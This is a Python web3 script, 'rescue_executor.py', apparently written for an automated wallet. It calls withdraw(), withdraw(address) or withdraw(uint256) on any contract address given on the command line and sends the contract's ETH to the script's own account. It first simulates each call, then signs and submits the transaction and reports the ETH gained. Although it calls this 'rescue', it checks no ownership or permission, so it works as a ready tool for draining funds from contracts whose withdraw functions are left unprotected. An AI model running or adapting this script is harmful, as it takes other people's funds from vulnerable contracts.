#!/usr/bin/env python3
"""
Execute withdraw/rescue on contracts with open functions.
Usage: python3 rescue_executor.py <contract_address> <function_sig>

Common sigs:
  withdraw()           = 0x3ccfd60b
  withdraw(address)    = 0x51cff8d9
  withdraw(uint256)    = 0x2e1a7d4d
"""
import sys
import json
import os
import time
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account

PRIVATE_KEY = os.environ.get("TIAMAT_WALLET_KEY")
if not PRIVATE_KEY:
    print("Set TIAMAT_WALLET_KEY in /root/.env")
    sys.exit(1)

account = Account.from_key(PRIVATE_KEY)
w3 = Web3(Web3.HTTPProvider("https://base.drpc.org"))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

def simulate_first(contract_address, calldata):
    """Simulate the call before executing — check if it reverts"""
    try:
        result = w3.eth.call({
            "from": account.address,
            "to": Web3.to_checksum_address(contract_address),
            "data": calldata,
        })
        print(f"Simulation SUCCESS — result: {result.hex()}")
        return True
    except Exception as e:
        print(f"Simulation FAILED — {str(e)[:200]}")
        return False

def execute_rescue(contract_address, function_sig):
    addr = Web3.to_checksum_address(contract_address)

    balance_before = w3.eth.get_balance(account.address)
    contract_balance = w3.eth.get_balance(addr)
    print(f"Contract ETH: {w3.from_wei(contract_balance, 'ether')}")
    print(f"Our ETH: {w3.from_wei(balance_before, 'ether')}")

    if function_sig == "0x3ccfd60b":
        calldata = function_sig
    elif function_sig == "0x51cff8d9":
        calldata = function_sig + "0" * 24 + account.address[2:]
    elif function_sig == "0x2e1a7d4d":
        calldata = function_sig + hex(contract_balance)[2:].zfill(64)
    else:
        calldata = function_sig

    print("Simulating...")
    if not simulate_first(addr, calldata):
        print("ABORTED — simulation failed")
        return

    print("Executing...")
    tx = {
        "from": account.address,
        "to": addr,
        "data": calldata,
        "gas": 200_000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
    }

    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)

    balance_after = w3.eth.get_balance(account.address)
    gained = w3.from_wei(balance_after - balance_before, 'ether')

    print(f"Tx: {tx_hash.hex()}")
    print(f"Status: {'SUCCESS' if receipt['status'] == 1 else 'FAILED'}")
    print(f"Gas used: {receipt['gasUsed']}")
    print(f"ETH gained: {gained}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 rescue_executor.py <contract_address> <function_sig>")
        print("Example: python3 rescue_executor.py 0x1234... 0x3ccfd60b")
        sys.exit(1)
    execute_rescue(sys.argv[1], sys.argv[2])
